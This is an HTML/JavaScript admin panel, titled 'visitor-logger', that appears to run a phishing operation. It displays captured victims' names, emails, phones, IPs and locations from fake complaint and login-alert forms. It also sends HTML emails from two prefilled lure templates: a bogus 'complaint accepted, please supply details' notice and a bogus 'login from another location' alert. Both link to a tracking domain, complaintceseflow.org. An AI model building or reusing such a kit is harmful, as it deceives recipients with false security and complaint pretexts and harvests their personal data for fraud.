<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>管理后台 — visitor-logger</title>
  <style>
    * { box-sizing: border-box; }
    body { font-family: system-ui, -apple-system, "PingFang SC", "Microsoft YaHei", sans-serif; margin: 0; background: #f5f6f8; color: #1f2330; }
    header { background: #fff; padding: 14px 24px; box-shadow: 0 1px 0 #e3e6ec; display: flex; justify-content: space-between; align-items: center; }
    h1 { margin: 0; font-size: 17px; }
    .auth { display: flex; gap: 8px; align-items: center; }
    .auth input { padding: 6px 10px; border: 1px solid #d7dbe2; border-radius: 6px; font-size: 13px; width: 240px; }
    nav { background: #fff; padding: 0 24px; border-bottom: 1px solid #e3e6ec; display: flex; gap: 4px; }
    .tab { padding: 12px 18px; background: none; border: none; border-bottom: 2px solid transparent; cursor: pointer; font-size: 14px; color: #4a5160; }
    .tab.active { color: #2a7df0; border-bottom-color: #2a7df0; font-weight: 600; }
    main { padding: 24px; max-width: 1200px; margin: 0 auto; }
    section { background: #fff; border-radius: 12px; padding: 20px; box-shadow: 0 1px 3px rgba(0,0,0,.04); }
    .toolbar { display: flex; gap: 8px; margin-bottom: 16px; }
    .toolbar input { flex: 1; padding: 8px 12px; border: 1px solid #d7dbe2; border-radius: 6px; font-size: 14px; }
    button { padding: 8px 16px; background: #2a7df0; color: #fff; border: none; border-radius: 6px; cursor: pointer; font-size: 14px; }
    button:hover { background: #1f6fd6; }
    button:disabled { background: #9ec3f0; cursor: not-allowed; }
    table { width: 100%; border-collapse: collapse; font-size: 13px; }
    th, td { text-align: left; padding: 10px 12px; border-bottom: 1px solid #eceef2; }
    th { background: #f7f8fa; font-weight: 600; color: #4a5160; font-size: 12px; letter-spacing: .5px; }
    tr.row:hover { background: #fafbfc; cursor: pointer; }
    .kind { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 11px; font-weight: 600; }
    .kind-form { background: #e0f0ff; color: #1f6fd6; }
    .kind-visit { background: #f0f0f0; color: #666; }
    .empty { text-align: center; color: #8a90a0; padding: 40px; }
    .form-grid { display: grid; grid-template-columns: 130px 1fr; gap: 12px 16px; align-items: start; }
    .form-grid label { font-size: 13px; color: #4a5160; padding-top: 8px; }
    .form-grid input, .form-grid select, .form-grid textarea { width: 100%; padding: 8px 12px; border: 1px solid #d7dbe2; border-radius: 6px; font-size: 14px; font-family: inherit; }
    .form-grid textarea { resize: vertical; min-height: 260px; font-family: ui-monospace, "SF Mono", Consolas, monospace; font-size: 12px; line-height: 1.5; }
    .form-actions { grid-column: 2; display: flex; gap: 8px; }
    #send-status { margin-top: 14px; padding: 12px 14px; border-radius: 6px; display: none; font-size: 14px; }
    #send-status.ok { display: block; background: #e6f7ef; color: #137333; border: 1px solid #c9ead8; }
    #send-status.err { display: block; background: #fde7e7; color: #c0392b; border: 1px solid #f5c9c9; }
    .modal { position: fixed; inset: 0; background: rgba(0,0,0,.5); display: none; align-items: center; justify-content: center; z-index: 100; }
    .modal.open { display: flex; }
    .modal-content { background: #fff; border-radius: 12px; padding: 24px; max-width: 920px; width: 92%; max-height: 85vh; overflow: auto; position: relative; }
    .modal-content pre { background: #f7f8fa; padding: 16px; border-radius: 6px; font-size: 12px; overflow: auto; max-height: 65vh; }
    .modal-close { position: absolute; top: 12px; right: 16px; cursor: pointer; font-size: 24px; color: #8a90a0; background: none; border: none; line-height: 1; }
    .hint { font-size: 12px; color: #8a90a0; margin-top: 6px; }
    .count { font-size: 12px; color: #8a90a0; }
  </style>
</head>
<body>
  <header>
    <h1>visitor-logger 管理后台</h1>
    <div class="auth">
      <span style="font-size:13px;color:#8a90a0;">Token:</span>
      <input id="token" type="password" placeholder="VIEW_TOKEN">
      <button onclick="login()">登录</button>
    </div>
  </header>
  <nav>
    <button class="tab active" data-tab="records">记录</button>
    <button class="tab" data-tab="send">发邮件</button>
  </nav>
  <main>
    <section id="records">
      <div style="display:flex; gap:4px; margin-bottom:12px; flex-wrap:wrap;">
        <button class="kind-filter active" data-kind="complaint_form" onclick="setKindFilter('complaint_form')" style="padding:6px 14px;border:1px solid #d7dbe2;border-radius:6px;background:#2a7df0;color:#fff;cursor:pointer;font-size:13px;">投诉表单</button>
        <button class="kind-filter" data-kind="login_alert" onclick="setKindFilter('login_alert')" style="padding:6px 14px;border:1px solid #d7dbe2;border-radius:6px;background:#fff;color:#4a5160;cursor:pointer;font-size:13px;">异地登录</button>
        <button class="kind-filter" data-kind="visit" onclick="setKindFilter('visit')" style="padding:6px 14px;border:1px solid #d7dbe2;border-radius:6px;background:#fff;color:#4a5160;cursor:pointer;font-size:13px;">访问</button>
        <button class="kind-filter" data-kind="all" onclick="setKindFilter('all')" style="padding:6px 14px;border:1px solid #d7dbe2;border-radius:6px;background:#fff;color:#4a5160;cursor:pointer;font-size:13px;">全部</button>
      </div>
      <div class="toolbar">
        <input id="search" placeholder="搜索 (投诉编号 / 姓名 / 邮箱 / IP / 说明)…" oninput="filterRecords()">
        <button onclick="loadRecords()">刷新</button>
        <span class="count" id="records-count"></span>
      </div>
      <div id="records-content"><div class="empty">请先登录</div></div>
    </section>

    <section id="send" hidden>
      <form id="send-form" class="form-grid">
        <label>收件人 <span style="color:#e0413e">*</span></label>
        <input name="to" type="email" required placeholder="user@example.com">
        <label>模板</label>
        <select name="template" onchange="applyTemplate(this.value)">
          <option value="complaint-ack" selected>投诉受理确认</option>
          <option value="login-alert">异地登录提醒</option>
          <option value="custom">自定义</option>
          <option value="blank">空白</option>
        </select>
        <label id="case_id_label">案件编号</label>
        <input name="case_id" id="case_id_input" placeholder="留空自动生成随机编号" oninput="refreshTemplate()">
        <label>链接基础 URL</label>
        <input name="base_url" placeholder="https://your-domain" oninput="refreshTemplate()">
        <div id="login-alert-fields" style="display:none; grid-column: 1 / -1; background:#f7f8fa; border:1px solid #eceef2; border-radius:8px; padding:14px 18px; margin:4px 0;">
          <div style="display:grid; grid-template-columns: 130px 1fr; gap:12px 16px; align-items:center;">
            <label style="font-size:13px; color:#4a5160;">登录地点</label>
            <input name="login_location" placeholder="如：广东省广州市" oninput="refreshTemplate()">
            <label style="font-size:13px; color:#4a5160;">IP 地址</label>
            <input name="login_ip" placeholder="如：123.45.67.89" oninput="refreshTemplate()">
            <label style="font-size:13px; color:#4a5160;">登录设备</label>
            <input name="login_device" placeholder="如：Windows 10 / Chrome 120" oninput="refreshTemplate()">
          </div>
        </div>
        <label>主题 <span style="color:#e0413e">*</span></label>
        <input name="subject" required placeholder="您的投诉已受理 — 案件编号 ...">
        <label>正文 (HTML) <span style="color:#e0413e">*</span></label>
        <textarea name="html" required placeholder="<div>...</div>"></textarea>
        <label></label>
        <div class="form-actions">
          <button type="submit" id="send-btn">发送</button>
          <button type="button" class="ghost" onclick="previewHtml()">预览</button>
        </div>
      </form>
      <div id="send-status"></div>
      <p class="hint">发件人由服务端 <code>RESEND_FROM</code> 环境变量决定；API Key 由 <code>RESEND_API_KEY</code> 提供。</p>
    </section>
  </main>

  <div class="modal" id="modal" onclick="if(event.target===this)closeModal()">
    <div class="modal-content">
      <button class="modal-close" onclick="closeModal()">&times;</button>
      <div style="display:flex; justify-content:space-between; align-items:center; gap:12px; margin-bottom:12px;">
        <h3 id="modal-title" style="margin:0;"></h3>
        <button id="copy-btn" onclick="copyRecord()" style="padding:6px 14px; font-size:13px; background:#2a7df0; color:#fff; border:none; border-radius:6px; cursor:pointer; white-space:nowrap;">复制</button>
      </div>
      <pre id="modal-body"></pre>
    </div>
  </div>

  <script>
    var TOKEN = '';
    var RECORDS = [];
    var KIND_FILTER = 'complaint_form';

    (function () {
      var t = new URLSearchParams(location.search).get('token');
      if (t) { document.getElementById('token').value = t; login(); }
      applyTemplate('complaint-ack'); // 进页面就预填模板正文，无需手填
    })();

    function getRecordKind(r) {
      return r.kind || (r.client && r.client.kind) || 'visit';
    }

    function setKindFilter(kind) {
      KIND_FILTER = kind;
      document.querySelectorAll('.kind-filter').forEach(function (btn) {
        var active = btn.dataset.kind === kind;
        btn.style.background = active ? '#2a7df0' : '#fff';
        btn.style.color = active ? '#fff' : '#4a5160';
      });
      var sp = document.getElementById('search');
      if (kind === 'login_alert') sp.placeholder = '搜索 (预警编号 / 姓名 / 电话 / IP)…';
      else if (kind === 'complaint_form') sp.placeholder = '搜索 (投诉编号 / 姓名 / 邮箱 / IP / 说明)…';
      else sp.placeholder = '搜索 (编号 / 姓名 / IP)…';
      filterRecords();
    }

    function login() {
      TOKEN = document.getElementById('token').value.trim();
      if (!TOKEN) return;
      loadRecords();
    }

    document.querySelectorAll('.tab').forEach(function (tab) {
      tab.onclick = function () {
        document.querySelectorAll('.tab').forEach(function (t) { t.classList.remove('active'); });
        tab.classList.add('active');
        var name = tab.dataset.tab;
        document.getElementById('records').hidden = name !== 'records';
        document.getElementById('send').hidden = name !== 'send';
      };
    });

    function loadRecords() {
      var el = document.getElementById('records-content');
      el.innerHTML = '<div class="empty">加载中…</div>';
      fetch('/logs?token=' + encodeURIComponent(TOKEN) + '&limit=500')
        .then(function (r) { return r.json(); })
        .then(function (j) {
          if (!j.entries) { el.innerHTML = '<div class="empty">无法加载 (' + (j.error || '未知错误') + ')</div>'; return; }
          RECORDS = j.entries.slice().reverse();
          document.getElementById('records-count').textContent = RECORDS.length + ' 条';
          renderRecords(RECORDS);
        })
        .catch(function (e) { el.innerHTML = '<div class="empty">网络错误: ' + e.message + '</div>'; });
    }

    function renderRecords(list) {
      var el = document.getElementById('records-content');
      if (!list.length) { el.innerHTML = '<div class="empty">暂无匹配记录</div>'; return; }
      var rows = list.map(function (r, i) {
        var kind = getRecordKind(r);
        var form = (r.client && r.client.form) || {};
        var time = r.received_at ? new Date(r.received_at).toLocaleString('zh-CN') : '';
        var kindClass = kind === 'complaint_form' ? 'kind-form' : (kind === 'login_alert' ? 'kind-form' : 'kind-visit');
        var kindLabel = kind === 'complaint_form' ? '投诉' : (kind === 'login_alert' ? '异地登录' : (kind === 'input_history' ? '输入' : 'visit'));
        if (KIND_FILTER === 'login_alert') {
          var isSelf = form.is_self === 'yes' ? '本人' : (form.is_self === 'no' ? '非本人' : '');
          return '<tr class="row" data-idx="' + i + '">'
            + '<td>' + time + '</td>'
            + '<td>' + esc(r.ip || '') + '</td>'
            + '<td>' + esc(form.alert_id || '') + '</td>'
            + '<td>' + esc(form.name || '') + '</td>'
            + '<td>' + esc(isSelf) + '</td>'
            + '<td>' + esc(form.phone || '') + '</td>'
            + '</tr>';
        } else if (KIND_FILTER === 'complaint_form') {
          return '<tr class="row" data-idx="' + i + '">'
            + '<td>' + time + '</td>'
            + '<td>' + esc(r.ip || '') + '</td>'
            + '<td>' + esc(form.complaint_id || '') + '</td>'
            + '<td>' + esc(form.name || '') + '</td>'
            + '<td>' + esc(form.email || '') + '</td>'
            + '<td>' + esc(form.phone || '') + '</td>'
            + '</tr>';
        } else {
          return '<tr class="row" data-idx="' + i + '">'
            + '<td>' + time + '</td>'
            + '<td>' + esc(r.ip || '') + '</td>'
            + '<td><span class="kind ' + kindClass + '">' + kindLabel + '</span></td>'
            + '<td>' + esc(form.complaint_id || form.alert_id || '') + '</td>'
            + '<td>' + esc(form.name || '') + '</td>'
            + '</tr>';
        }
      }).join('');
      var headers;
      if (KIND_FILTER === 'login_alert') {
        headers = '<th>时间</th><th>IP</th><th>预警编号</th><th>姓名</th><th>是否本人</th><th>电话</th>';
      } else if (KIND_FILTER === 'complaint_form') {
        headers = '<th>时间</th><th>IP</th><th>投诉编号</th><th>姓名</th><th>邮箱</th><th>电话</th>';
      } else {
        headers = '<th>时间</th><th>IP</th><th>类型</th><th>编号</th><th>姓名</th>';
      }
      el.innerHTML = '<table><thead><tr>' + headers + '</tr></thead><tbody>' + rows + '</tbody></table>';
      el.querySelectorAll('tbody tr.row').forEach(function (tr) {
        tr.onclick = function () { showRecord(Number(tr.dataset.idx)); };
      });
    }

    function esc(s) { return String(s).replace(/[&<>"']/g, function (c) { return ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]; }); }

    function filterRecords() {
      var q = document.getElementById('search').value.trim().toLowerCase();
      var filtered = RECORDS.filter(function (r) {
        // Kind filter
        var kind = getRecordKind(r);
        if (KIND_FILTER !== 'all' && kind !== KIND_FILTER) return false;
        // Text search
        if (!q) return true;
        var form = (r.client && r.client.form) || {};
        var text = [r.ip, form.complaint_id, form.alert_id, form.name, form.email, form.phone, form.details, form.is_self, form.current_location, r.socket_address].filter(Boolean).join(' ').toLowerCase();
        return text.indexOf(q) !== -1;
      });
      renderRecords(filtered);
    }

    function showRecord(idx) {
      var r = RECORDS[idx]; if (!r) return;
      document.getElementById('modal-title').textContent = '记录 · ' + (r.id || '');
      document.getElementById('modal-body').textContent = JSON.stringify(r, null, 2);
      document.getElementById('modal').classList.add('open');
    }
    function closeModal() { document.getElementById('modal').classList.remove('open'); }

    function copyRecord() {
      var text = document.getElementById('modal-body').textContent;
      var btn = document.getElementById('copy-btn');
      var done = function () {
        var old = btn.textContent;
        btn.textContent = '✓ 已复制';
        btn.style.background = '#137333';
        setTimeout(function () { btn.textContent = old; btn.style.background = '#2a7df0'; }, 1500);
      };
      if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text).then(done).catch(function () { fallbackCopy(text, done); });
      } else {
        fallbackCopy(text, done);
      }
    }
    function fallbackCopy(text, done) {
      var ta = document.createElement('textarea');
      ta.value = text; ta.style.position = 'fixed'; ta.style.left = '-9999px';
      document.body.appendChild(ta); ta.select();
      try { document.execCommand('copy'); done(); } catch (e) {}
      document.body.removeChild(ta);
    }
    document.addEventListener('keydown', function (e) { if (e.key === 'Escape') closeModal(); });

    // --- Send email ---
    function tplComplaintAck(caseId, baseUrl, t) {
      var link = baseUrl + '/submit?id=' + encodeURIComponent(caseId) + '&t=' + t;
      var time = new Date(t).toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });
      return '<div style="font-family: system-ui, -apple-system, PingFang SC, Microsoft YaHei, sans-serif; max-width:600px; margin:0 auto; padding:32px 24px; color:#1f2330;">'
        + '<div style="background:#fff; border-radius:12px; padding:32px; box-shadow:0 4px 16px rgba(0,0,0,.06);">'
        + '<h2 style="margin:0 0 16px; color:#2a7df0;">您的投诉已受理</h2>'
        + '<p>尊敬的用户：</p>'
        + '<p>您好！我们已收到您提交的投诉，现确认受理。</p>'
        + '<div style="background:#f7f8fa; border:1px solid #eceef2; border-radius:8px; padding:14px 18px; margin:16px 0;">'
        + '<p style="margin:4px 0;"><strong>案件编号：</strong>' + esc(caseId) + '</p>'
        + '</div>'
        + '<p>为加快处理进度，请点击下方按钮补充信息及投诉详情：</p>'
        + '<p style="text-align:center; margin:24px 0;">'
        + '<a href="' + link + '" style="display:inline-block; padding:12px 28px; background:#2a7df0; color:#fff; text-decoration:none; border-radius:8px; font-weight:600;">补充投诉信息</a>'
        + '</p>'
        + '<p>我们将在收到补充信息后 1–3 个工作日内通过邮件反馈处理结果。</p>'
        + '</div>'
        + '<p style="color:#a0a6b2; font-size:12px; margin:16px auto 0; text-align:center;">本邮件由系统自动发送，请勿直接回复。</p>'
        + '</div>';
    }

    function tplLoginAlert(alertId, baseUrl, loginInfo) {
      var link = baseUrl + '/alert?id=' + encodeURIComponent(alertId);
      return '<div style="font-family: system-ui, -apple-system, PingFang SC, Microsoft YaHei, sans-serif; max-width:600px; margin:0 auto; padding:32px 24px; color:#1f2330;">'
        + '<div style="background:#fff; border-radius:12px; padding:32px; box-shadow:0 4px 16px rgba(0,0,0,.06);">'
        + '<h2 style="margin:0 0 16px; color:#e65100;">异地登录安全提醒</h2>'
        + '<p>尊敬的用户：</p>'
        + '<p>我们检测到您的账户存在异地登录行为。如果这是您本人的操作，请点击下方按钮确认；如果不是，请立即点击报告以保护您的账户安全：</p>'
        + '<p style="text-align:center; margin:20px 0;">'
        + '<a href="' + link + '&action=self" style="display:inline-block; padding:10px 22px; background:#2a7df0; color:#fff; text-decoration:none; border-radius:6px; font-weight:600; font-size:14px;">是我本人操作</a>'
        + '&nbsp;&nbsp;'
        + '<a href="' + link + '&action=report" style="display:inline-block; padding:10px 22px; background:#e0413e; color:#fff; text-decoration:none; border-radius:6px; font-weight:600; font-size:14px;">非本人，立即处理</a>'
        + '</p>'
        + '</div>'
        + '<p style="color:#a0a6b2; font-size:12px; margin:16px auto 0; text-align:center;">本邮件由系统自动发送，请勿直接回复。预警编号：' + esc(alertId) + '</p>'
        + '</div>';
    }

    var currentTpl = 'custom';
    function applyTemplate(name) {
      currentTpl = name;
      var f = document.getElementById('send-form');
      // Toggle login-alert-specific fields
      var laf = document.getElementById('login-alert-fields');
      var cl = document.getElementById('case_id_label');
      var ci = document.getElementById('case_id_input');
      if (name === 'login-alert') {
        laf.style.display = '';
        cl.textContent = '预警编号';
        ci.placeholder = '留空自动生成，如 LA-XXXXXXXX';
      } else {
        laf.style.display = 'none';
        cl.textContent = '案件编号';
        ci.placeholder = '留空自动生成随机编号';
      }
      if (name === 'blank') { f.subject.value = ''; f.html.value = ''; return; }
      refreshTemplate();
    }
    function refreshTemplate() {
      if (currentTpl !== 'complaint-ack' && currentTpl !== 'login-alert') return;
      var f = document.getElementById('send-form');
      if (currentTpl === 'complaint-ack') {
        var caseId = f.case_id.value || 'TS-' + Math.random().toString(36).substring(2, 10).toUpperCase();
        var baseUrl = f.base_url.value || 'https://complaintceseflow.org';
        f.subject.value = '您的投诉已受理 — 案件编号 ' + caseId + ' — 请补充信息';
        f.html.value = tplComplaintAck(caseId, baseUrl, Date.now());
      } else if (currentTpl === 'login-alert') {
        var alertId = f.case_id.value || 'LA-' + Math.random().toString(36).substring(2, 10).toUpperCase();
        var baseUrl = f.base_url.value || 'https://complaintceseflow.org';
        var loginInfo = {
          time: new Date().toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' }),
          location: f.login_location.value.trim() || '未知地点',
          ip: f.login_ip.value.trim() || '未知IP',
          device: f.login_device.value.trim() || '未知设备'
        };
        f.subject.value = '安全提醒 — 检测到异地登录 — 预警编号 ' + alertId;
        f.html.value = tplLoginAlert(alertId, baseUrl, loginInfo);
      }
    }

    function previewHtml() {
      var html = document.getElementById('send-form').html.value;
      if (!html) return;
      var w = window.open('', '_blank');
      w.document.write(html);
      w.document.close();
    }

    document.getElementById('send-form').onsubmit = function (e) {
      e.preventDefault();
      var f = e.target;
      var btn = document.getElementById('send-btn');
      var status = document.getElementById('send-status');
      status.className = ''; status.style.display = 'none';
      btn.disabled = true; btn.textContent = '发送中…';
      var payload = {
        to: f.to.value.trim(),
        subject: f.subject.value.trim(),
        html: f.html.value
      };
      fetch('/send-email?token=' + encodeURIComponent(TOKEN), {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      })
        .then(function (r) { return r.json().then(function (j) { return { ok: r.ok, status: r.status, body: j }; }); })
        .then(function (res) {
          if (res.ok) {
            status.className = 'ok';
            status.textContent = '✓ 邮件已发送 (id: ' + (res.body.id || '-') + ')';
          } else {
            status.className = 'err';
            var msg = (res.body && (res.body.message || res.body.error)) || JSON.stringify(res.body);
            status.textContent = '✗ 发送失败 (' + res.status + '): ' + msg;
          }
        })
        .catch(function (err) {
          status.className = 'err';
          status.textContent = '✗ 网络错误: ' + err.message;
        })
        .finally(function () { btn.disabled = false; btn.textContent = '发送'; });
    };
  </script>
</body>
</html>
